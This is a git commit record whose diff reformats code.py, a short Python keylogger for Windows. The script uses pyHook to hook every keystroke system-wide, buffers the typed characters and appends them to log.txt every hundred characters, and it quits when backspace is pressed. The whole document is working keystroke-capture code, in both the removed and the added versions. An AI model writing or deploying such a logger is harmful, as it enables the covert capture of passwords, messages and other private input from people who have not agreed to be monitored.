005e3052a7e0f2041d3d5339d2af15d1b2daa776
moneeb777 <moneeb777@hotmail.com>
2016-02-24 17:59:04 +0500

    Better code layout

--- code.py
+++ code.py
@@ -1,39 +1,44 @@
+import pyHook
+import pythoncom
+import sys
+import os
 
-import pyHook, pythoncom, sys, logging
+file_log = 'log.txt'  # To output logged keys
+data = ''  # To hold logged keys
 
-file_log='log.txt'	#To output logged keys
-data=''			#To hold logged keys
 
 def OnKeyBoardEvent(event):
-	global data
-	# logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-	# logging.log(10,chr(event.Ascii))
-	
-	if event.Ascii==8: #Exit on backspace
-		exit(1)
-	elif event.Ascii==13: #Carraige return representation
-		key='<ENTER>'
-	elif event.Ascii==9: #TAB Representation
-		key='<TAB>'
-	else:
-		key=chr(event.Ascii)
+    global data
+    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    # logging.log(10,chr(event.Ascii))
 
-	data=data+key
+    if event.Ascii == 8:  # Exit on backspace
+        exit(1)
+    elif event.Ascii == 13:  # Carraige return representation
+        key = '<ENTER>'
+    elif event.Ascii == 9:  # TAB Representation
+        key = '<TAB>'
+    else:
+        key = chr(event.Ascii)
 
-	if len(data)>100:
-		OutputKeys()
-	return True
+    data += key
 
-def OutputKeys(): 
-	global data
+    if len(data) > 100:
+        OutputKeys()
+    return True
 
-	f=open('log.txt','a') #Open log file to write keyss
-	f.write(data) 
-	f.close()
-	data=''
-	return True
 
-hooks_manager=pyHook.HookManager()     #Create a hook
-hooks_manager.KeyDown=OnKeyBoardEvent  #Assign keydown event handler
-hooks_manager.HookKeyboard()           #assign hook to the keyboard
+def OutputKeys():
+    global data
+
+    f = open('log.txt', 'a')  # Open log file to write keyss
+    f.write(data)
+    f.close()
+    data = ''
+    return True
+
+
+hooks_manager=pyHook.HookManager()     # Create a hook
+hooks_manager.KeyDown=OnKeyBoardEvent  # Assign keydown event handler
+hooks_manager.HookKeyboard()           # assign hook to the keyboard
 pythoncom.PumpMessages()             
